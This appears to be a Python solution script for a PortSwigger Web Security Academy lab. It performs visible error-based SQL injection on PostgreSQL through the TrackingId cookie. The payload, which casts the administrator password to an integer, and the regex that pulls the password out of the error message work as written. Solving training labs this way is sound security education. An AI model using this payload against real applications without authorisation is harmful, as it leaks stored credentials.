# Lab 13 — Visible Error-Based SQL Injection
# PortSwigger: https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based
#
# Vulnerability: TrackingId cookie
# Aim:           Leak the administrator password from a verbose SQL error message
#
# DB: PostgreSQL
#
# How it works:
#   CAST((SELECT password FROM users LIMIT 1) AS int) forces PostgreSQL to convert
#   a string (the password) to an integer. This fails with:
#     ERROR: invalid input syntax for type integer: "secretpassword"
#   The password is embedded directly in the error message — no iteration needed.
#
# NOTE: Including the original tracking ID value causes an "unterminated literal"
#       error before our payload even runs. Dropping it still injects correctly
#       because id='' matches zero rows, and the UNION/subquery still executes.
#
# Usage: python lab13.py <url>

import re
import sys
import requests
import urllib3
from proxies import proxies
from sqli_utils import banner, section

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


if __name__ == "__main__":
    banner()
    section("LAB 13 — VISIBLE ERROR-BASED SQLi (POSTGRESQL)")

    if len(sys.argv) != 2:
        print("  Usage: python lab13.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = requests.Session()
    session.verify   = False
    session.proxies  = proxies

    # Drop the original tracking ID — including it causes an early "unterminated
    # literal" error that prevents our payload from executing (see lab notes).
    payload = "' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--"

    response = session.get(url, cookies={"TrackingId": payload})

    if "ERROR" not in response.text and "invalid input syntax" not in response.text:
        print("  ✘  No error returned — payload may not have executed.")
        print("  Full response:\n", response.text[:500])
        sys.exit(1)

    # PostgreSQL error format:
    #   ERROR: invalid input syntax for type integer: "thepassword"
    match = re.search(
        r'invalid input syntax for type integer: "([^"]+)"',
        response.text,
    )

    if match:
        password = match.group(1)
        print(f"\n  ★  Administrator password extracted from error: {password}")
    else:
        # Error appeared but regex didn't match — print raw snippet for manual inspection
        print("  ✔  Error response received but could not parse password automatically.")
        print("  ─── Raw error snippet ───")
        # Print the relevant portion of the response around the error
        start = response.text.find("ERROR")
        print(response.text[start:start + 300])
